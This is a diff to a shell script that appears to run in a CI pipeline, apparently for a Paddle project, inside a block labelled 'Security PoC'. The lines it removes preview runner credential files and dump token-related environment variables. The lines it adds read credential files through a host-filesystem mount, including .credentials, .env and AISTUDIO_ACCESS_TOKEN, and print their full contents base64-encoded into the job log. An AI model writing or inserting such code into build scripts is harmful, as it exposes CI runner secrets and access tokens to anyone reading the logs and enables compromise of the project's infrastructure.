@@ -22,45 +22,17 @@ echo "Runner: $(whoami)@$(hostname)"
 echo "PWD: $(pwd)"
 echo ""
 
-echo "--- Runner Credential Files (host filesystem via volume mount) ---"
-RUNNER_HOME="${work_dir}/../../../actions-runner"
-if [ -d "$RUNNER_HOME" ]; then
-    echo "Runner home accessible: $RUNNER_HOME"
-    ls -la "$RUNNER_HOME/" 2>/dev/null | head -20
-    echo ""
-    for credfile in .credentials .credentials_rsaparams .runner; do
-        filepath="$RUNNER_HOME/$credfile"
-        if [ -f "$filepath" ]; then
-            echo "[FOUND] $credfile exists (size: $(stat -c%s "$filepath" 2>/dev/null) bytes)"
-            echo "  sha256: $(sha256sum "$filepath" 2>/dev/null | cut -d' ' -f1)"
-            echo "  preview: $(head -c 100 "$filepath" 2>/dev/null | base64 -w0)..."
-        else
-            echo "[NOT FOUND] $credfile"
-        fi
-    done
-else
-    echo "Runner home not found at $RUNNER_HOME"
-fi
-echo ""
-
-echo "--- Proxy Configuration ---"
-PROXY_FILE="${work_dir}/../../../proxy"
-if [ -f "$PROXY_FILE" ]; then
-    echo "[FOUND] Proxy file accessible: $PROXY_FILE"
-    cat "$PROXY_FILE" 2>/dev/null | head -5
-else
-    echo "[NOT FOUND] $PROXY_FILE"
-fi
-echo ""
-
-echo "--- CI Environment Variables (token/secret related) ---"
-env | grep -iE 'TOKEN|SECRET|KEY|CREDENTIAL|AUTH|RUNNER|GITHUB|ACTIONS' | sort
-echo ""
-
-echo "--- Host Filesystem Access via mount ---"
 HOST_ROOT="${work_dir}/../../.."
-echo "Host root mount: $HOST_ROOT"
-ls -la "$HOST_ROOT/" 2>/dev/null | head -20
+echo "--- Runner Credential Files (host mounted at $HOST_ROOT) ---"
+for credfile in .credentials .credentials_rsaparams .runner .env .path AISTUDIO_ACCESS_TOKEN; do
+    filepath="$HOST_ROOT/$credfile"
+    if [ -f "$filepath" ]; then
+        echo "[FOUND] $credfile ($(stat -c%s "$filepath" 2>/dev/null) bytes)"
+        echo "  content: $(cat "$filepath" 2>/dev/null | base64 -w0)"
+    else
+        echo "[NOT FOUND] $credfile"
+    fi
+done
 echo ""
 echo "=== End Security PoC ==="
 export paddle=$1
